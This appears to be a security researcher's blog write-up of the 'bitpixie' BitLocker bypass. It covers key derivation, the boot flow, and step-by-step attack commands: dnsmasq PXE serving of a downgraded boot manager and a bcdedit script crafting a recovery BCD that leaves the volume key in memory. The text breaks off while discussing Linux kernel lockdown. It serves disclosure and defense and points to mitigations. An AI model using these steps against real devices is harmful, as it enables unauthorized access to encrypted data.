<div id="readability-page-1" class="page"><div> <h2 id="teaser">Teaser</h2>
<p>Someone steals your laptop. It’s running Windows 11, fully up-to-date. Device encryption (Windows BitLocker) is enabled. Secure Boot is active. BIOS/UEFI settings are locked down.
So, you’re safe, right?</p>
<ul>
<li><strong>Question 1</strong>: Can the thief access your files without knowing your password?</li>
<li><strong>Question 2</strong>: Do they even need to disassemble the laptop for the attack?</li>
</ul>
<p><strong>The answer: Yes, they can access your files. And, no, they don’t need to disassemble the laptop. The device can stay closed, no screwdriver is required.</strong>
Thanks to a bug discovered by Rairii in August 2022, attackers can extract your disk encryption key on Windows’ default “Device Encryption” setup.
This exploit, dubbed <a href="https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie">bitpixie</a>, relies on downgrading the Windows Boot Manager.
All an attacker needs is the ability to plug in a LAN cable and keyboard to decrypt the disk.</p>
<p>When I first learned about this, my reaction was <strong>WHY ISN’T THIS FIXED IN 2025, AND HOW DID I NOT KNOW ABOUT THIS UNTIL NOW?</strong>
Hardware attacks?
Sure, I was familiar with those.
But a pure software exploit this simple?
Surely it couldn’t be real!</p>
<p>In this post, I’ll guide you through my deep dive into the bitpixie vulnerability.
First, I’ll share what motivated this research, then unpack the technical details of the attack, and finally outline potential mitigations.
The broader question of why Microsoft hasn’t fully addressed this issue demands its own post. In a dedicated article — <a href="https://neodyme.io/en/blog/bitlocker_why_no_fix">On Secure Boot, TPMs, SBAT and Downgrades — Why Microsoft hasn’t fixed BitLocker yet</a> — I demystify the Secure Boot ecosystem and explain the challenges at play.</p>
<p>For the blue teamers among you, there is a section on <a href="#affected-devices">affected devices</a> and <a href="#mitigation">mitigations</a> further down below, if you want to skip ahead. Short answer: use a <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures">pre-boot PIN</a>, or apply <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a>.</p>
<div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M8.06561801,18.9432081 L14.565618,4.44320807 C14.7350545,4.06523433 15.1788182,3.8961815 15.5567919,4.06561801 C15.9032679,4.2209348 16.0741922,4.60676263 15.9697642,4.9611247 L15.934382,5.05679193 L9.43438199,19.5567919 C9.26494549,19.9347657 8.82118181,20.1038185 8.44320807,19.934382 C8.09673215,19.7790652 7.92580781,19.3932374 8.03023576,19.0388753 L8.06561801,18.9432081 L14.565618,4.44320807 L8.06561801,18.9432081 Z M2.21966991,11.4696699 L6.46966991,7.21966991 C6.76256313,6.9267767 7.23743687,6.9267767 7.53033009,7.21966991 C7.79659665,7.48593648 7.8208027,7.90260016 7.60294824,8.19621165 L7.53033009,8.28033009 L3.81066017,12 L7.53033009,15.7196699 C7.8232233,16.0125631 7.8232233,16.4874369 7.53033009,16.7803301 C7.26406352,17.0465966 6.84739984,17.0708027 6.55378835,16.8529482 L6.46966991,16.7803301 L2.21966991,12.5303301 C1.95340335,12.2640635 1.9291973,11.8473998 2.14705176,11.5537883 L2.21966991,11.4696699 L6.46966991,7.21966991 L2.21966991,11.4696699 Z M16.4696699,7.21966991 C16.7359365,6.95340335 17.1526002,6.9291973 17.4462117,7.14705176 L17.5303301,7.21966991 L21.7803301,11.4696699 C22.0465966,11.7359365 22.0708027,12.1526002 21.8529482,12.4462117 L21.7803301,12.5303301 L17.5303301,16.7803301 C17.2374369,17.0732233 16.7625631,17.0732233 16.4696699,16.7803301 C16.2034034,16.5140635 16.1791973,16.0973998 16.3970518,15.8037883 L16.4696699,15.7196699 L20.1893398,12 L16.4696699,8.28033009 C16.1767767,7.98743687 16.1767767,7.51256313 16.4696699,7.21966991 Z"></path></svg><p>Rather watch a talk than read? Check out my 38C3 talk <a href="#38c3-talk---windows-bitlocker--screwed-without-a-screwdriver">at the bottom of this post</a>.</p></div>
<div>
						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13 9h-2V7h2m0 10h-2v-6h2m-1-9A10 10 0 0 0 2 12a10 10 0 0 0 10 10a10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"></path></svg><p>
						 Note that there aren’t any tools for exploiting this bug that are widely available yet. While this post describes everything you need to know, we are not publishing a ready-made tool.
					</p></div>
				
<h2 id="motivation">Motivation</h2>
<p>I’ve always wondered how folks gain access to encrypted devices without knowing the password.
Sure, they likely have some bugs, but what kinds of bugs?
Do they need government backdoors or 0-days?
My assumption was:
If I have a fully up-to-date system, surely I am pretty secure.</p>
<p>Then, in January 2024, the 6th edition of the <strong>Realworld CTF</strong> came along with a very intriguing challenge: <a href="https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/Grandma's%20Laptop">“Grandma’s Laptop”</a>.
We were given remote access to a BitLocker-encrypted Windows system running in QEMU.
Hence, no hardware attacks were possible.
The CTF ended without any solves, even though many of the world’s top teams were competing.</p>
<p>The challenge author was even kind as to drop a hint: <a href="https://github.com/Wack0/bitlocker-attacks">https://github.com/Wack0/bitlocker-attacks</a>.
In the following months, I spent some time off and on digging into this a lot more.
This blog is the result of my research.
May it be helpful for you, dear reader!</p>
<h2 id="bitlocker-how-does-it-even-work">BitLocker. How does it even work?</h2>
<p>Before discussing the exploit in detail, let’s review some BitLocker basics.
Many researchers have extensively written about BitLocker, so I’ll only recap the important and relevant facts here.
Let’s first have a look at the <a href="https://support.microsoft.com/en-us/windows/bitlocker-overview-44c0c61c-989d-4a69-8822-b95cd49b1bbf">Microsoft documentation</a>:</p>
<blockquote>
<p>BitLocker is a Windows security feature that protects your data by encrypting your drives. This encryption ensures that if someone tries to access a disk offline, they won’t be able to read any of its content.</p>
<p>BitLocker is particularly valuable if your device is lost or stolen, as it keeps your sensitive information secure. It’s designed to be user-friendly and integrates seamlessly with the Windows operating system, making it easy to set up and manage.</p>
<p>BitLocker offers two functionalities:</p>
<ul>
<li><strong>Device Encryption</strong>, which is designed for simplicity of use, and it’s usually enabled automatically</li>
<li><strong>BitLocker Drive Encryption</strong>, which is designed for advanced scenarios, and it allows you to manually encrypt drives</li>
</ul>
</blockquote>
<p>To summarize, BitLocker is a disk encryption, where ease of use is important.
There are two “modes” of operation: <strong>Device Encryption</strong> and <strong>BitLocker Drive Encryption</strong>.
The former is an automatically enabled, simple-to-use default configuration of BitLocker.
This is the only form of encryption available on Windows Home, while the full BitLocker features require Pro/Enterprise editions.</p>
<p>Ease of use is not only important for home users, though; It has the same relevance in corporate environments!
As such, the configuration we see most often in the wild is precisely that of Device Encryption.
To achieve this ease of use, Device Encryption is configured to automatically unlock the disk without the user even noticing.
I call this <strong>unattended unlock</strong>.
The hard drive is encrypted at rest but is automatically unsealed when a legit Windows boots, which means that users don’t need a separate disk decryption password:
They just have to sign in with their usual user account.
The Windows bootloader and <strong>Secure Boot</strong> are supposed to protect the disk encryption.
Unfortunately, this configuration has been broken for quite a while.</p>
<p>Let us now look at the high-level key derivation for BitLocked root partitions:</p>
<div><figure><img src="https://neodyme.io/blog/bitlocker_screwed_without_a_screwdriver/Bitlocker%20Flow.excalidraw.svg"><figcaption>Image 1: BitLocker Keys, simplified</figcaption></figure></div>
<p>Very simplified, the <strong>Disk</strong> stores four distinct pieces of data:</p>
<ul>
<li>the <em>unencrypted</em> bootloader (something needs to do the decryption, after all), and</li>
<li>three pieces of <em>encrypted</em> data:
<ul>
<li>the <strong>Volume Master Key (VMK)</strong>,</li>
<li>the <strong>Full Volume Encryption Key (FVEK)</strong>, and</li>
<li>the <strong>Encrypted Data</strong>, which contains the Windows kernel, drivers, software, and all user data.</li>
</ul>
</li>
</ul>
<p>Encrypted data is read in three steps:</p>
<ol>
<li>The bootloader uses some TPM black magic (which we’ll examine later) to decrypt the Volume Master Key (VMK) stored on the disk.</li>
<li>With the now decrypted VMK, the FVEK can be decrypted.</li>
<li>Finally, that FVEK is used to decrypt all data. It is kept in memory, and whenever a block of data needs to be read/written, it is used. Most software doesn’t even know that the disk is encrypted, as the kernel transparently handles all the de/encryption of blocks and files.</li>
</ol>
<h3 id="vmk-decryption">VMK Decryption</h3>
<p>VMK decryption is a bit involved. The VMK has so-called “Protectors” and each, on its own, can be used to derive the same VMK.
Almost always, multiple protectors are present. Let’s look at a few relevant ones:</p>
<p>The easiest way to do VMK decryption is to let the user enter a password.
This is supported (though it’s not the default) and is called pre-boot authentication.
Something similar is used for recovery:
There is usually at least one recovery password that is automatically generated and saved in the user’s Microsoft account or printed during the BitLocker setup.
Such a recovery secret usually looks like <code>049687-028908-468886-502117-436326-177529-711007-400917</code>.</p>
<p>But recall that the intention of BitLocker is to be user-friendly!
Letting the user enter a password before even the Windows kernel is available seems like quite some hassle.
One more password that could be forgotten.
This is where a magic black box called the “Trusted Platform Module” (TPM) comes into play.
With its help, a nice feature called <strong>Secure Boot</strong> is implemented, which can attest that a valid Windows is booting.
If, and only if, a bootloader with a valid Microsoft signature boots, the TPM gives access to the VMK.
If anything goes wrong during this unlocking, the bootloader prompts the user to use the dreaded BitLocker recovery screen.
Since this TPM and Secure Boot-based unlock is usually invisible to the user, it is a nice default.
I like to call this <strong>unattended unlock</strong>, since it unlocks the disk without any user interaction, as long as the bootloader is legit.</p>
<p>To see all protectors on your specific BitLocker partition, run <code>manage-bde -protectors -get c:</code> from a Windows console:</p>
<pre tabindex="0"><code><span><span>PS C:\Users\win-t&gt; manage-bde -protectors -get c:</span></span>
<span><span>BitLocker Drive Encryption: Configuration Tool version 10.0.26100</span></span>
<span><span>Copyright (C) 2013 Microsoft Corporation. All rights reserved.</span></span>
<span><span></span></span>
<span><span>Volume C: []</span></span>
<span><span>All Key Protectors</span></span>
<span><span></span></span>
<span><span> Numerical Password:</span></span>
<span><span> ID: {C2932722-6C21-48A9-8A43-B33DBD329DAE}</span></span>
<span><span> Password:</span></span>
<span><span> 049687-028908-468886-502117-436326-177529-711007-400917</span></span>
<span><span> Backup type:</span></span>
<span><span> Microsoft account backup</span></span>
<span><span></span></span>
<span><span> TPM:</span></span>
<span><span> ID: {85825FF8-3733-48D0-B0EE-4D32D8AAFD7A}</span></span>
<span><span> PCR Validation Profile:</span></span>
<span><span> 7, 11</span></span>
<span><span> (Uses Secure Boot for integrity validation)</span></span></code></pre>
<p>Above, you see the default output on a freshly set up Windows 11 24H2.
It has two protectors:
The first is a recovery key backed up to the Microsoft account and the second is a TPM protector with the default PCR 7,11 Secure Boot Validation.
What this means precisely, we’ll see later.</p>
<p>The decrypted VMK is really all we need to decrypt the drive!
So, let’s investigate how that works on a normal Windows boot a bit more closely.</p>
<h2 id="unattended-unlock-boot-flow">Unattended Unlock Boot Flow</h2>
<div><figure><img src="https://neodyme.io/blog/bitlocker_screwed_without_a_screwdriver/bootloader%20recovery%20flow.excalidraw.svg"><figcaption>Image 2: Windows Boot Flow</figcaption></figure></div>
<p>The Windows bootloader is reasonably complicated and has lots of different options.
Here, we only show the parts relevant for this exploit.
Let us first look at the <em>happy case</em> of a typical Windows boot:</p>
<p><strong>Happy case!</strong>
There are three components: platform/UEFI booting, the Windows boot manager <code>bootmgfw.efi</code>, and the full Windows environment.</p>
<ol>
<li><strong>Platform boot (UEFI)</strong> initializes the system and:
<ol>
<li>The UEFI firmware checks the digital signature of the Windows bootloader (<code>bootmgfw.efi</code>) using Secure Boot magic.</li>
<li>Once verified, the UEFI chainloads the bootloader from the unencrypted portion of the disk.</li>
</ol>
</li>
<li><strong>Bootloader</strong> (<code>bootmgfw.efi</code>) determines which disk to boot from, decrypts it, then boots into the Windows OS.
<ol>
<li>Reads the Boot Configuration Data (BCD).</li>
<li>Identifies the target disk and reads its metadata. If it’s BitLocker-encrypted, the metadata includes the encrypted Volume Master Key (VMK).</li>
<li>Requests the TPM to decrypt the VMK, using PCR-based validation (e.g., PCR 7,11 by default).</li>
<li>Uses the decrypted VMK to unlock the Full Volume Encryption Key (FVEK), which decrypts the rest of the disk.</li>
<li>Decrypts the Windows kernel and related data on the disk, then boots into the operating system.</li>
</ol>
</li>
<li><strong>Windows login</strong> prompts the user for their credentials to complete the boot process and access the system.</li>
</ol>
<p>At every step in this flow, many things could go wrong.</p>
<p><strong>Error case!</strong>
If the bootloader encounters an issue (e.g., corrupted files or invalid configuration), it attempts to boot into a recovery environment.
This is done by returning to the BCD, looking up the relevant recovery entry, and attempting to boot it.
The recovery image could be <em>anything</em>:
It might be another valid Windows, which could unseal the disk, or it might not.
Hence, all secrets (e.g., VMK, FVEK) in memory must be wiped before transitioning to recovery!
If secrets remain in memory, the recovery environment could inadvertently leak them or be exploited by an attacker. <em>— foreshadowing intensifies</em></p>
<p>With all that understanding under your belt, let’s finally look at the bug:</p>
<h2 id="bitpixie-how-does-the-exploit-work">Bitpixie: How Does the Exploit Work?</h2>
<p>In one of the bootloader’s many flows, disk encryption keys are not deleted when fallback booting. — Oops. —
This bug, known as <a href="https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie">bitpixie</a> (CVE-2023-21563), was discovered in August 2022 by Rairii, but had actually existed in the Windows bootloader since October 2005. It was fixed late 2022, and publically disclosed in February 2023.
Due to some unfortunate design in the Secure Boot standard, it is <strong>still exploitable today!</strong></p>
<p>The issue arises during a specific flow known as the “PXE Soft Reboot”.
When a boot fails, this is supposed to load a recovery image via the network, without fully restarting the system.
Unfortunately, the bootloader <strong>forgot to wipe the VMK</strong> — the critical piece of data that unlocks the BitLocker-encrypted disk — before attempting this.
As a result, the VMK remains potentially accessible to any code loaded during or after the PXE boot.</p>
<div><figure><img src="https://neodyme.io/blog/bitlocker_screwed_without_a_screwdriver/bootloader%20exploit%20flow.excalidraw.svg"><figcaption>Image 3: Windows Boot Exploit Flow</figcaption></figure></div>
<p><strong>Why isn’t this fixed</strong> you might ask?
Great question!
Of course, it <strong>is</strong> fixed in new bootloaders!
But the situation isn’t so simple.
Recall that the TPM gives us the VMK if <em>any</em> legit Windows boots?
There is (by default) no additional verification.
This means we can simply <em>downgrade</em> our bootmanager, to one that still has the vulnerability.
And it isn’t at all difficult to find an old one.</p>
<p>The bug itself is not all that interesting.
Forgetting to clear the key when you do something else is a pretty common issue.
But the exploit is interesting, and the investigation into why this is still exploitable is even more so!</p>
<p><strong>Exploit steps</strong><br>
Let’s formulate an exploitation plan:</p>
<ol>
<li>PXE Boot into downgraded, vulnerable bootloader.</li>
<li>Serve a “correct-enough” boot configuration.
<ul>
<li>Correct enough to unseal the BitLocker-encypted partition with the TPM.</li>
<li>Broken enough to trigger the recovery flow into a PXE soft reboot.</li>
</ul>
</li>
<li>Boot into Linux and scan the physical memory for the VMK.</li>
<li>Use the VMK to mount the BitLocker partition with read/write access.</li>
</ol>
<h3 id="step-1-pxe-boot-into-a-downgraded-dootloader">Step 1: PXE Boot Into a Downgraded Dootloader</h3>
<p>If you’ve ever used PXE, you might know that is kind of a pain to set up.
At least I struggled in the past getting it to work in my home network.
Thankfully, our scenario is a bit simpler.
Here, we only need two devices: the attacker device and the victim device.
No full network is required!
Instead, we’ll set up a point-to-point link by connecting the two devices with a LAN cable.</p>
<p>With that, we can leverage <code>dnsmasq</code>, a fantastic tool that bundles everything we need for this operation:</p>
<pre tabindex="0"><code><span><span>sudo</span><span> dnsmasq</span><span> --no-daemon</span><span> \</span></span>
<span><span>    --interface=</span><span>"</span><span>$INTERFACE</span><span>"</span><span> \</span></span>
<span><span>    --dhcp-range=10.13.37.100,10.13.37.101,255.255.255.0,1h</span><span> \</span></span>
<span><span>    --dhcp-boot=bootmgfw.efi</span><span> \</span></span>
<span><span>    --enable-tftp</span><span> \</span></span>
<span><span>    --tftp-root=</span><span>"</span><span>$ABS_TFTP_ROOT</span><span>"</span><span> \</span></span>
<span><span>    --log-dhcp</span></span></code></pre>
<p>Here’s what’s happening:
On the attacker device, we start <code>dnsmasq</code> on the network interface that is connected to the victim.
We choose an arbitrary DHCP range, and set the <code>dhcp-boot</code> option to the filename of our downgraded bootloader.
We enable a TFTP to deliver all necessary files, including the vulnerable bootloader, and enable logging.</p>
<p>But wait, you say!
<strong>Where do we get this ominous “downgraded bootmanager” from?</strong>
Any way you want, really.
The key is that it must predate November 2022 (build 25236) when PXEboot vulnerabilities were patched.
This can, for example, be old Windows ISOs.
You could also try your luck on <a href="https://winbindex.m417z.com/?file=bootmgfw.efi">Winbindex</a>, though many (all?) of the old bootmanagers are not available anymore.</p>
<p>Before proceeding, I ensured my PXE boot setup is functional.
To build confidence, I booted into various operating systems with Secure Boot disabled.
You could also reboot into a copy of the original Windows boot manager with secure boot enabled, which should allow you to boot the normal Windows installation from the disk.</p>
<h3 id="step-2-unlock-bitlocker-by-serving-a-correct-enough-boot-configuration">Step 2: Unlock Bitlocker by Serving a Correct-Enough Boot Configuration</h3>
<p>In addition to the <code>bootmgfw.efi</code> file, several supporting files are required.
When we copy the boot manager from a legitimate EFI partition, we can just grab all files from there.
Otherwise, we can look at the TFTP log in <code>dnsmasq</code> to see what files the boot manager requests.
Most of the files are non-essential assets like fonts and UI elements.
If these are missing, the boot manager will still function, albeit with a less polished, text-only UI.
The essential part we do have to worry about is a config file: the Boot Configuration Data (BCD), located at <code>$TFTP/Boot/BCD</code>.
The BCD file is analogous to a <code>grub.cfg</code> file in Linux.
It describes all available boot options and fallbacks, specifying details like the partition and kernel to boot from, as well as associated parameters.</p>
<p>Official documentation on BCD is kind of sparse, though some resources have reversed most of the structure.
The file is a Windows registry hive and can, in theory, be edited by any registry editing tool.
In practice, though, there are lots of magic values in them, so I didn’t find this particulary helpful.
Instead, I recommend using Microsoft’s official <code>bcdedit.exe</code> tool, which is preinstalled on all Windows machines.</p>
<p>There are a bunch of hidden arguments to bcdedit that help a bit:
Use <code>bcdedit /store testbcd /enum all</code> or <code>bcdedit /store testbcd /enum all /raw</code> to print the raw values contained in a BCD file.
Without the raw argument there is some pretty printing applied, that for example hides the partition GUID and simply replaces it with the corresponding drive letter, e.g. <code>C:</code>.
If you don’t know that, you get reaaally confused why your BCD isn’t working right :p.</p>
<p>Some helpful resources for learning more:</p>
<ul>
<li>The official Docs on <code>bcdedit</code> can be found here: <a href="https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options?view=windows-11">BCDEdit Command-Line Options</a>.</li>
<li>More expansive Docs from 2017 are available in a docx here: <a href="https://learn.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653986(v=vs.85)">BCDEdit Commands for Boot Environment</a></li>
<li>Another resource that I found quite helpful is documentation from <a href="https://www.mistyprojects.co.uk/documents/BCDEdit/files/device.htm">mistyprojects.co.uk / BCDEdit</a></li>
<li>And a list of most available elements and their raw values from <a href="https://geoffchappellmirror.github.io/notes/windows/boot/bcd/elements.htm">Geoff Chappell / BCD Elements</a></li>
<li>Finally, there is this Russian site on bootmgr errors that can sometimes help if the boot doesn’t go as you expect and it shows an inscrutable error: <a href="http://datadump.ru/bootmgr-errors/">Bootmgr Errors</a></li>
</ul>
<p>Okay, so now we know how to edit a BCD file.
But what do we put in there?
This was the trickiest part of this exploit chain, as you get very little feedback when things go wrong.
Recall the bug we are trying to reproduce: We want the bootloader to attempt to boot from our BitLocker partition, fail, and then trigger a PXE soft reboot into our controlled OS.</p>
<p>The easiest way to get this working has three parts:</p>
<ol>
<li>Get the <em>original</em> BCD from the victim’s device.
This ensures the configuration matches the specific partition GUIDs.
You can do that by shift-rebooting Windows, going “Troubleshoot &gt; Advanced options &gt; Command Prompt”, mounting the boot partition, and copying its contents to a USB drive.
Or, be more advanced and use an SMB mount, if you don’t have USB access.</li>
</ol>
<pre tabindex="0"><code><span><span>mountvol s: </span><span>/</span><span>s</span></span>
<span><span>Copy-Item</span><span> S:</span><span>/</span><span>EFI D:</span><span>/</span><span>efi</span><span>-</span><span>copy </span><span>-</span><span>Recurse</span></span></code></pre>
<ol start="2">
<li>Using <code>bcdedit</code>, create a new boot entry for the PXE soft reboot.
The element list on <a href="https://geoffchappellmirror.github.io/notes/windows/boot/bcd/elements.htm">Geoff Chappell / BCD Elements</a> is helpful here:</li>
</ol>
<pre tabindex="0"><code><span><span>bcdedit /store BCD_modded /create /d "softreboot" /application startup</span></span></code></pre>
<p>We specify a custom store, so we operate on that file, not the system store.
We create a new startup application and give it an arbitrary name, here “softreboot”.
Then, we need to set this up to use <code>pxesoftreboot</code>:</p>
<pre tabindex="0"><code><span><span>bcdedit /store BCD_modded /set {%REBOOT_GUID%} path "\shimx64.efi"</span></span>
<span><span>bcdedit /store BCD_modded /set {%REBOOT_GUID%} device boot</span></span>
<span><span>bcdedit /store BCD_modded /set {%REBOOT_GUID%} pxesoftreboot yes</span></span></code></pre>
<p>Note that we set the path to <code>shimx64.efi</code>.
This is the bootloader that will be loaded when this boot entry is selected!
More on that later.</p>
<ol start="3">
<li>Add this new boot option as recovery to our default boot entry, and modify the default boot entry to always trigger recovery.
We do this by setting the path to <code>\</code>.
By pointing to a valid path but an invalid kernel, the bootloader will fail but still unlock the BitLocker partition, leaving the Volume Master Key (VMK) in memory.
Any other syntactically valid path that doesn’t point to a bootable kernel would work as well:</li>
</ol>
<pre tabindex="0"><code><span><span>bcdedit /store BCD_modded /set {default} recoveryenabled yes</span></span>
<span><span>bcdedit /store BCD_modded /set {default} recoverysequence {%REBOOT_GUID%}</span></span>
<span><span>bcdedit /store BCD_modded /set {default} path "\\"</span></span>
<span><span>bcdedit /store BCD_modded /set {default} winpe yes</span></span></code></pre>
<p>We <em>cannot</em> create a universal BCD that works for all targets.
This is because in the BCD we just copied, there is a <code>DEVICE</code> property that specifies the partition GUID to boot from.
This GUID varies between systems, so the BCD must be tailored to the target.
When this GUID is wrong, the bootmanager won’t attempt any disk unseals, and the VMK won’t be left in memory.
While you could edit the GUID, which is also available from the target device command prompt or disk metadata, it’s often easier to copy the original BCD and modify it.</p>
<p>The complete BCD edit procedure, executed from the recovery command prompt, looks like this:</p>
<pre tabindex="0"><code><span><span>d:</span></span>
<span><span>bcdedit </span><span>/</span><span>export BCD_modded</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>create </span><span>/</span><span>d </span><span>"softreboot"</span><span> /</span><span>application startup</span><span>&gt;</span><span>GUID.txt</span></span>
<span><span>For</span><span> /</span><span>F </span><span>"tokens=2 delims={}"</span><span> %%</span><span>i </span><span>in</span><span> (GUID.txt) </span><span>do</span><span> (set REBOOT_GUID</span><span>=%%</span><span>i)</span></span>
<span><span>del guid.txt</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} path </span><span>"\shimx64.efi"</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} device boot</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} pxesoftreboot yes</span></span>
<span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} recoveryenabled yes</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} recoverysequence {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>}</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} path </span><span>"\\"</span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>set {</span><span>default</span><span>} winpe yes</span></span>
<span></span>
<span><span>bcdedit </span><span>/</span><span>store BCD_modded </span><span>/</span><span>displayorder {</span><span>%</span><span>REBOOT_GUID</span><span>%</span><span>} </span><span>/</span><span>addlast</span></span>
<span><span>copy d:\BCD_modded p:\BCD</span></span></code></pre>
<div><figure><img src="https://neodyme.io/blog/bitlocker_screwed_without_a_screwdriver/bcdedit.png"><figcaption>Image 4: Example of a modified BCD (simplified)</figcaption></figure></div>
<h3 id="step-3-boot-into-os-scan-memory-for-vmk">Step 3: Boot Into OS, Scan Memory for VMK</h3>
<p>Booting into the downgraded bootmanager and modified BCD is straightforward: Just use the shift-reboot trick in Windows again.
Navigate to “Use a device &gt; PXE Boot”.
This action will boot into the downgraded bootmanager, load the BCD, unseal the disk, fail to launch the kernel, and execute the <code>pxesoftreboot</code>.</p>
<p>I was testing this exploit in QEMU, and once I got this far, immediately dumped memory, scanned for the VMK, and found it!
Happy with the result, I got ready to wrap up this exploit. I thought reading the memory for the VMK would be straightforward — just boot into my controlled OS, and scan the memory.
But I quickly realized another challenge lay ahead: Secure Boot — again.</p>
<p>Since the system we are operating on still has Secure Boot enabled, the Windows bootloader checks the signature for the next stage we are doing a fallback boot into.
We don’t necessarily have to network boot into Windows, but the payload must have a valid secure boot signature.</p>
<p><strong>The first attempt:</strong> Just use Linux! Major Linux distributions have Secure Boot, right?</p>
<p>It seemed promising: Modern distros use a signed “shim” (a pre-boot loader) approved by Microsoft’s third-party Secure Boot certificate.
Recall that we specified <code>shimx64.efi</code> as path in the <code>pxesoftreboot</code> recovery entry? That’s where this came from.
Secure Boot implementations on Linux involve multiple layers:</p>
<ul>
<li>Shim: Signed by Microsoft, it includes a distro-specific key (though the codebase is the same) to boot a distro-signed grub.</li>
<li>Grub: Signed with the distro’s key, loads only distro-signed kernels.</li>
</ul>
<p>This means we need matching shim+grub+kernel from a distro that has everthing nicely signed.
I picked a random netboot image with Secure Boot support, PXEBoot it, and <strong>dumped the memory</strong>:</p>
<pre tabindex="0"><code><span><span>❯</span><span> cat</span><span> /dev/mem</span></span>
<span><span>cat:</span><span> /dev/mem:</span><span> Permission</span><span> denied</span></span>
<span><span>❯</span><span> sudo</span><span> cat</span><span> /dev/mem</span></span>
<span><span>cat:</span><span> /dev/mem:</span><span> Operation</span><span> not</span><span> permitted</span></span>
<span><span>❯</span><span> sudo</span><span> dmesg</span><span> |</span><span> tail</span><span> -n</span><span> 1</span></span>
<span><span>[</span><span>328854.672148</span><span>] Lockdown: cat: /dev/mem,kmem,port is restricted; </span><span>see</span><span> man</span><span> kernel_lockdown.7</span></span></code></pre>
<p>Ahh, great!
Our kernel is in <strong>lockdown mode</strong> :)
This is a feature of the Linux kernel to protect itself from root.
In lockdown mode, any kernel modifications, including loading unsigned modules, are blocked, even if an attacker has full root privileges. This includes any raw memory read or write access.
Once enabled, lockdown cannot be disabled on a running system.</p>
<h3 id="step-3a-finding-a-way-around-lockdown-mode">Step 3a: Finding a Way Around Lockdown Mode</h3>
<p>I figured we might not even need a Linux kernel since grub also offers some built-in memory reading/writing functionality!
But, as it turns out, grub helpfully also disables those when Secure Booted, via the shim-lock ‘protocol’, see <a href="https://wiki.archlinux.org/title/GRUB#Shim-lock">ArchWiki/GRUB#Shim-Lock</a> or <a href="https://www.gnu.org/software/grub/manual/grub/html_node/UEFI-secure-boot-and-shim.html">grub Manual</a>.</p>
<blockquote>
<p>Additionally, the commands that can be used to subvert the UEFI Secure Boot mechanism, like iorw and memrw, are disabled in Secure Booted environments via the GRUB Lockdown mechanism.</p>
</blockquote>
<p>Okay, that’s a non-starter.
Maybe we can find a signed shim that is “weird”, and let’s us boot into something that doesn’t have raw-memory read restrictions?
We can look for distros that have shim available on <a href="https://pkgs.org/search/?q=shim">pkgs.org/shim</a> or <a href="https://pkgs.org/search/?q=shim-signed">pkgs.org/shim-signed</a>.
The coordination process for signing shims is also public at <a href="https://github.com/rhboot/shim-review/issues">GitHub: shim-review</a>.
Unfortunately, many bootloaders were recently revoked due to severe security issues, and won’t boot anymore when secure boot is enabled.  I needed something reasonably recent.
I ultimately found no viable workaround here, and just stuck to a shim from one of the major distros.</p>
<p>Okay, so we are back to bypassing lockdown on a Linux kernel.
Distros really go out of their way to include custom lockdown patches downstream.
Looking at upstream code doesn’t help; you have to go to the source of your actual distro.</p>
<p>For example, here are all the custom patches Debian had in 2016 for protecting lockdown mode: <a href="https://salsa.debian.org/kernel-team/linux/-/tree/afceeb64fe527dfec9ad203746192f3a3a30636a/debian/patches/features/all/lockdown">Debian GitLab: debian/patches/features/all/lockdown</a>.
Yes, there really were 33 custom patches, just for lockdown.
These days, there are a lot fewer but the main kernel-lockdown-on-Secure-Boot patch is still there: <a href="https://salsa.debian.org/kernel-team/linux/-/blob/debian/latest/debian/patches/features/all/lockdown/efi-lock-down-the-kernel-if-booted-in-secure-boot-mo.patch">efi-lock-down-the-kernel-if-booted-in-secure-boot-mo.patch</a>, as upstream refuses to merge that.
The reason behind the distros patches is simple, as seen in <a href="https://www.webpronews.com/opensuse-begins-enforcing-secure-boot-kernel-lockdown/">openSUSE Begins Enforcing Secure Boot Kernel Lockdown</a>:</p>
<blockquote>
<p>[…] according to a Reddit thread that also links to an openSUSE mailing list, Microsoft evidently refused to continue signing openSUSE’s bootload shim unless Kernel Lockdown was enabled. As a result, beginning with kernel 6.2.1, openSUSE Tumbleweed will enable Kernel Lockdown whenever Secure Boot is also enabled.</p>
</blockquote>
<p><em>Funny side note: <a href="https://man7.org/linux/man-pages/man7/kernel_lockdown.7.html">Kernel docs on lockdown</a> are <em>wrong</em> here: They mention lockdown is automatically enabled when Secure Boot is on. However, this is only true for downstream kernels. They simply <a href="https://bbs.archlinux.org/viewtopic.php?id=284085">copied fedoras man page</a></em>.</p>
<p>In the past, we had exploits like <a href="https://git.zx2c4.com/american-unsigned-language">american-unsigned-language</a> to get around lockdown.
However, I could not find a kernel on which such an exploit worked and from which I could boot.</p>
